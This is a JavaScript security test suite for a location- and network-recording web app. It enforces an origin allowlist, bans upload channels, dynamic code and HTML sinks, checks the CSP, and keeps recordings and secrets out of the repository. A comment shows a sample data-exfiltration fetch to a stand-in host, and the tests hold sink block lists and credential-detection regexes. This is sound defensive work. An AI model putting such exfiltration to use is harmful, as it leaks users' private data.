// Security tests. The site records a person's location and network behaviour, so the
// properties enforced here are: it contacts nothing but its seven probes, it has no way to
// upload what it records, it executes no dynamic code, and it ships no third-party code.
import assert from 'node:assert';
import {readFileSync, readdirSync} from 'node:fs';
import {execFileSync} from 'node:child_process';
import {createRequire} from 'node:module';
const require = createRequire(import.meta.url);
import {suite} from './helpers.mjs';

const root = new URL('..', import.meta.url).pathname;
const read = f => readFileSync(new URL(`../${f}`, import.meta.url), 'utf8');
const jsFiles = readdirSync(new URL('../js', import.meta.url)).map(f => `js/${f}`);
const sources = [...jsFiles, 'sw.js'].map(f => [f, read(f)]);
const html = read('index.html');

// The only hosts this application may ever contact.
const ALLOWED_ORIGINS = [
  'https://[2606:4700:4700::1111]',
  'https://1.1.1.1',
  'https://%RANDOM%.github.io',
  'https://wts-dns-control.github.io',
  'https://www.gstatic.com',
  'https://speed.cloudflare.com',
  'stun:stun.cloudflare.com:3478'
];

const s = suite('security');

s.test('the source files MUST contain no outbound origin outside ALLOWED_ORIGINS WHEN every URL literal is scanned', () => {
  const found = new Set();
  for (const [file, src] of sources) {
    for (const m of src.matchAll(/(?:https?|stun):(?:\/\/)?[^\s'"`)]+/g)) {
      const url = m[0];
      // Comments carry documentation links; only string literals reach the network.
      const line = src.slice(src.lastIndexOf('\n', m.index) + 1, src.indexOf('\n', m.index));
      if (line.trimStart().startsWith('//') || line.trimStart().startsWith('*')) continue;
      found.add(`${file} ${url}`);
    }
  }
  for (const entry of found) {
    const url = entry.split(' ')[1];
    assert.ok(ALLOWED_ORIGINS.some(o => url.startsWith(o)),
              `undeclared outbound origin: ${entry}`);
  }
  assert.ok(found.size > 0, 'the allowlist check inspected something');
});

// A scan for forbidden URL literals passes `fetch('https:' + '//elsewhere/?d=' + data)` and
// protocol-relative `//elsewhere`. Enumerating the call sites is exhaustive instead: the
// application reaches the network from one expression.
s.test('js/ MUST contain one fetch call, taking a URL built by probeUrl WHEN the call sites are enumerated', () => {
  const calls = [];
  for (const [file, src] of sources) {
    for (const m of src.matchAll(/\bfetch\s*\(/g)) {
      const line = src.slice(src.lastIndexOf('\n', m.index) + 1, src.indexOf('\n', m.index));
      calls.push({file, line: line.trim()});
    }
  }
  const app = calls.filter(c => c.file.startsWith('js/'));
  assert.equal(app.length, 1, `one fetch in the application: ${app.map(c => c.file + ' ' + c.line)}`);
  assert.match(app[0].line, /await fetch\(url, \{$/, `and its URL is the probe's own: ${app[0].line}`);

  const probe = read('js/probe.js');
  // `url` can only come from probeUrl, which can only come from the PROBES table.
  assert.match(probe, /const url = probeUrl\(probe\);/, 'url is built by probeUrl');
  for (const m of probe.matchAll(/function probeUrl\(probe\) \{[\s\S]*?\n\}/g)) {
    assert.ok(!/\+/.test(m[0].replace(/\/\/.*/g, '')) || /replace\(/.test(m[0]),
              `probeUrl assembles a URL by hand: ${m[0]}`);
  }

  const sw = calls.filter(c => c.file === 'sw.js');
  assert.equal(sw.length, 2, 'the service worker fetches only to fill and serve its shell');
  for (const c of sw) {
    assert.ok(/fetch\(new Request\(u, \{cache: 'reload'\}\)\)/.test(c.line) ||
              /fetch\(e\.request\)/.test(c.line), `unreviewed service worker fetch: ${c.line}`);
  }
});

s.test('the source files MUST contain no write method, request body, sendBeacon or persistent channel WHEN scanned', () => {
  for (const [file, src] of sources) {
    // The bare identifiers are banned too: the shorthand `{method, body}` carries the same
    // meaning as `method: 'POST'`.
    assert.ok(!/method:\s*['"](POST|PUT|PATCH)['"]/i.test(src), `${file} issues a write request`);
    assert.ok(!/\bbody\s*[:,}]/.test(src.replace(/res\.body|\.body\b/g, '')),
              `${file} attaches a request body`);
    assert.ok(!/\bmethod\s*[,}]/.test(src), `${file} passes a method it computed`);
    assert.ok(!/navigator\.sendBeacon/.test(src), `${file} uses sendBeacon`);
    assert.ok(!/new\s+(WebSocket|EventSource)/.test(src), `${file} opens a persistent channel`);
  }
});

// An image, a stylesheet or a preload hint carries a URL to a third party without a fetch.
// At runtime only CSP stops those; this keeps them out of the source.
s.test('the source files MUST assign no URL sink and index.html MUST carry no resource tag WHEN scanned', () => {
  for (const [file, src] of sources) {
    for (const sink of ['new Image', 'new Audio', 'importScripts', 'navigator.sendBeacon',
                        'XMLHttpRequest']) {
      assert.ok(!src.includes(sink), `${file} uses ${sink}`);
    }
    // The one URL assigned to an element is the blob built for saving a recording. Anything
    // else on src/href/action is a request issued without a fetch.
    for (const m of src.matchAll(/\.(src|href|action)\s*=\s*([^;\n]+)/g)) {
      assert.equal(`${file}:${m[1]}=${m[2].trim()}`, `${file}:href=url`,
                   `${file} assigns ${m[1]} = ${m[2].trim()}`);
    }
    for (const m of src.matchAll(/createObjectURL\(([^)]*)/g)) {
      assert.match(m[1], /^new Blob\(\[/, `${file}: createObjectURL over ${m[1]}, not a local blob`);
    }
    // Protocol-relative literals inherit https: at runtime and match no origin check.
    assert.ok(!/['"`]\/\/[a-z0-9]/i.test(src), `${file} contains a protocol-relative URL`);
  }
  for (const tag of ['<img', '<iframe', '<object', '<embed', '<form']) {
    assert.ok(!html.includes(tag), `index.html contains ${tag}`);
  }
});

// The UDP probe needs a peer connection to gather ICE candidates. Gathering alone carries no
// data: sending requires a data channel, a track, or a remote description completing the
// negotiation, all of which stay banned.
s.test('the source files MUST use a recvonly transceiver and no data-carrying WebRTC API WHEN scanned', () => {
  for (const [file, src] of sources) {
    for (const sink of ['createDataChannel', 'setRemoteDescription', 'addTrack', 'addStream',
                        'getUserMedia', 'getDisplayMedia']) {
      assert.ok(!src.includes(sink), `${file} uses ${sink}, which would let the connection carry data`);
    }
    for (const m of src.matchAll(/addTransceiver\([^)]*\)/g)) {
      assert.match(m[0], /direction:\s*'recvonly'/, `${file}: ${m[0]} must be receive-only`);
    }
  }
  const probe = read('js/probe.js');
  assert.ok(probe.includes('new RTCPeerConnection'), 'the UDP probe exists');
  assert.match(probe, /pc\.close\(\)/, 'and every connection is closed again');
});

s.test('every fetch in js/probe.js MUST pass credentials omit and referrerPolicy no-referrer WHEN the calls are read', () => {
  const fetches = read('js/probe.js').match(/fetch\([\s\S]*?\}\)/g) || [];
  assert.ok(fetches.length > 0, 'found the fetch calls');
  for (const f of fetches) {
    assert.match(f, /credentials:\s*'omit'/, 'every fetch omits credentials');
    assert.match(f, /referrerPolicy:\s*'no-referrer'/, 'and sends no referrer');
  }
});

s.test('the source files MUST contain no eval, Function constructor, string timeout or dynamic import WHEN scanned', () => {
  for (const [file, src] of sources) {
    assert.ok(!/\beval\s*\(/.test(src), `${file} uses eval`);
    assert.ok(!/new\s+Function\s*\(/.test(src), `${file} uses new Function`);
    assert.ok(!/setTimeout\s*\(\s*['"`]/.test(src), `${file} passes a string to setTimeout`);
    assert.ok(!/import\s*\(/.test(src), `${file} imports dynamically`);
  }
});

s.test('the source files MUST contain no innerHTML, outerHTML, insertAdjacentHTML or document.write WHEN scanned', () => {
  for (const [file, src] of sources) {
    for (const sink of ['innerHTML', 'outerHTML', 'insertAdjacentHTML', 'document.write']) {
      assert.ok(!src.includes(sink), `${file} writes through ${sink}`);
    }
  }
});

s.test('index.html MUST reference only same-origin resources and carry no inline handler or script WHEN parsed', () => {
  for (const m of html.matchAll(/(?:src|href)\s*=\s*"([^"]+)"/g)) {
    const v = m[1];
    assert.ok(!/^https?:|^\/\//.test(v), `index.html loads an external resource: ${v}`);
  }
  assert.ok(!/\son[a-z]+\s*=/i.test(html), 'index.html contains an inline event handler');
  assert.ok(!/<script(?![^>]*\ssrc=)/i.test(html), 'index.html contains an inline script');
});

s.test('the CSP in index.html MUST set default-src none and limit script, style, manifest and worker sources to self WHEN parsed', () => {
  const m = /<meta http-equiv="Content-Security-Policy" content="([^"]+)"/.exec(html);
  assert.ok(m, 'a CSP is present');
  const csp = Object.fromEntries(m[1].split(';').map(d => {
    const [k, ...v] = d.trim().split(/\s+/);
    return [k, v.join(' ')];
  }));
  assert.equal(csp['default-src'], "'none'", 'every source is denied by default');
  for (const d of ['script-src', 'style-src', 'manifest-src', 'worker-src']) {
    assert.equal(csp[d], "'self'", `${d} is limited to this origin`);
  }
  assert.equal(csp['base-uri'], "'none'");
  assert.equal(csp['form-action'], "'none'");
  // connect-src cannot name the IPv6 probe: the host-source grammar has no syntax for a
  // bracketed literal, and naming it makes the browser ignore the source and block the probe.
  // The allowlist test above is the enforcement.
  assert.match(csp['connect-src'], /^'self' https:$/);
  // STUN is not fetched, so connect-src does not gate it, and no browser enforces a
  // webrtc-src directive. The allowlist test above constrains it.
});

// A module missing from the precache list loads online and breaks the app offline, which is
// the condition recovery depends on.
s.test('sw.js MUST precache every js file, index.html, app.css and the manifest, and list only files that exist WHEN the shell is read', () => {
  const sw = read('sw.js');
  const shell = [...sw.matchAll(/'([^']+\.(?:js|css|html|svg|png|webmanifest))'/g)].map(m => m[1]);
  for (const f of readdirSync(new URL('../js', import.meta.url))) {
    assert.ok(shell.includes(`js/${f}`), `js/${f} is not precached; the app would break offline`);
  }
  for (const f of ['index.html', 'app.css', 'manifest.webmanifest']) {
    assert.ok(shell.includes(f), `${f} is not precached`);
  }
  // A listed file that does not exist fails the install and caches nothing.
  const {existsSync} = require('node:fs');
  for (const f of shell) {
    assert.ok(existsSync(new URL(`../${f}`, import.meta.url)), `${f} is precached but missing`);
  }
});

s.test('sw.js MUST pass through cross-origin and non-GET requests and omit skipWaiting WHEN read', () => {
  const sw = read('sw.js');
  assert.match(sw, /url\.origin !== self\.location\.origin/, 'cross-origin requests pass through untouched');
  assert.match(sw, /e\.request\.method !== 'GET'/, 'and so does anything that is not a GET');
  // Matches the call, since the word alone appears in a comment in sw.js.
  assert.ok(!/\bskipWaiting\s*\(/.test(sw), 'a new version never takes over a tab mid-session');
});

s.test('package.json MUST declare no runtime dependencies and the sources MUST import nothing outside the repository WHEN read', () => {
  const pkg = JSON.parse(read('package.json'));
  assert.deepEqual(pkg.dependencies, undefined, 'no runtime dependencies');
  assert.ok(!/from\s+['"][^.]/.test(sources.map(([, s]) => s).join('\n')),
            'no module is imported from outside this repository');
});

// A recorded journey carries a home address, a workplace and a daily timetable, so .dev is
// excluded as a directory.
s.test('.dev MUST be untracked and ignored as a whole directory WHEN git ls-files and check-ignore are run', () => {
  const tracked = execFileSync('git', ['ls-files'], {cwd: root, encoding: 'utf8'})
    .split('\n').filter(Boolean);
  const leaked = tracked.filter(f => f.startsWith('.dev/'));
  assert.deepEqual(leaked, [], `local-only files are tracked: ${leaked.join(', ')}`);

  // The rule covers the directory, so renaming an export inside it changes nothing.
  const rules = readFileSync(new URL('../.gitignore', import.meta.url), 'utf8')
    .split('\n').map(l => l.trim());
  assert.ok(rules.includes('.dev/'), '.gitignore ignores the directory as a whole');

  // Checked through git, which answers the ignore rules for a path that does not exist.
  const check = execFileSync('git', ['check-ignore', '-v', '.dev/anything/at/all.json'],
                             {cwd: root, encoding: 'utf8'});
  assert.match(check, /\.dev\//, `git ignores anything under it: ${check.trim()}`);
});

// Fixtures are committed deliberately and are safe only because the anonymiser stripped
// them, so each is checked by name.
s.test('every committed fixture MUST carry format wts/fixture and pass assertClean WHEN read from tests/fixtures', async () => {
  const {assertClean} = await import('../tools/anonymise.mjs');
  const dir = new URL('../tests/fixtures/', import.meta.url);
  const files = readdirSync(dir).filter(f => f.endsWith('.json'));
  assert.ok(files.length > 0, 'there are fixtures to check');
  for (const f of files) {
    const j = JSON.parse(readFileSync(new URL(f, dir), 'utf8'));
    assert.equal(j.format, 'wts/fixture', `${f} must not be mistakable for a real export`);
    assert.doesNotThrow(() => assertClean(j), `${f} still carries identifying data`);
  }
});

s.test('the tracked text files MUST carry no session format marker and no coordinates WHEN each is scanned', () => {
  const tracked = execFileSync('git', ['ls-files'], {cwd: root, encoding: 'utf8'})
    .split('\n').filter(Boolean);
  // Matched on shape: a recording saved as .txt or pasted into a note carries the same
  // format marker.
  const binary = /\.(png|jpg|jpeg|gif|svg|ico|woff2?|ttf|zip|pdf)$/;
  for (const f of tracked) {
    if (f === 'package.json' || f === 'package-lock.json' || binary.test(f)) continue;
    const text = readFileSync(new URL(`../${f}`, import.meta.url), 'utf8');
    assert.ok(!/"format"\s*:\s*"wts\/(session|bundle)"/.test(text),
              `${f} is a recorded journey and must not be committed`);
    // Applies to the fixtures too: they keep every measurement and no position.
    assert.ok(!/"lat"\s*:\s*-?\d/.test(text), `${f} contains coordinates`);
  }
});

s.test('the tracked sources MUST match no credential pattern WHEN scanned for tokens, keys and inline secrets', () => {
  const patterns = [
    [/\bghp_[A-Za-z0-9]{36}\b/, 'GitHub token'],
    [/\bAKIA[0-9A-Z]{16}\b/, 'AWS key id'],
    [/-----BEGIN [A-Z ]*PRIVATE KEY-----/, 'private key'],
    [/\b(api[_-]?key|secret|passwd|password|token)\s*[:=]\s*['"][^'"]{12,}['"]/i, 'inline secret']
  ];
  for (const [file, src] of [...sources, ['index.html', html], ['README.md', read('README.md')]]) {
    for (const [re, label] of patterns) {
      assert.ok(!re.test(src), `${file} appears to contain a ${label}`);
    }
  }
});

s.test('testInterval MUST return null WHEN the hostname is other than localhost', () => {
  const main = read('js/main.js');
  const fn = /function testInterval\(\)[\s\S]*?\n}/.exec(main);
  assert.ok(fn, 'the override is a single named function');
  assert.match(fn[0], /location\.hostname !== 'localhost'/, 'gated on localhost');
  assert.match(fn[0], /return null/, 'and returns null on every other host');
  const uses = main.match(/testInterval\(\)/g) || [];
  assert.equal(uses.length, 2, 'it is defined once and called once');
});

// One description, shared by the repository, the install prompt and the page.
s.test('the descriptions in manifest.webmanifest and index.html MUST equal the one in package.json WHEN each is read', () => {
  const desc = JSON.parse(read('package.json')).description;
  assert.ok(desc && desc.length > 40, 'package.json carries the canonical description');
  assert.equal(JSON.parse(read('manifest.webmanifest')).description, desc,
               'the install prompt says the same thing');
  const meta = /<meta name="description" content="([^"]*)">/.exec(html);
  assert.ok(meta, 'the page has a description');
  assert.equal(meta[1], desc, 'and it matches');
});

s.test('APP_VERSION and the service worker CACHE MUST match the package.json version WHEN each is read', () => {
  const version = JSON.parse(read('package.json')).version;
  assert.match(version, /^\d+\.\d+\.\d+$/, 'package.json carries a semantic version');
  const app = /APP_VERSION = '([^']+)'/.exec(read('js/session.js'))[1];
  assert.equal(app, version, `js/session.js APP_VERSION (${app}) must match package.json (${version})`);
  const cache = /const CACHE = '([^']+)'/.exec(read('sw.js'))[1];
  assert.equal(cache, `wts-v${version}`,
               `the service worker cache (${cache}) must be wts-v${version}, or clients keep the old build`);
});

await s.run();
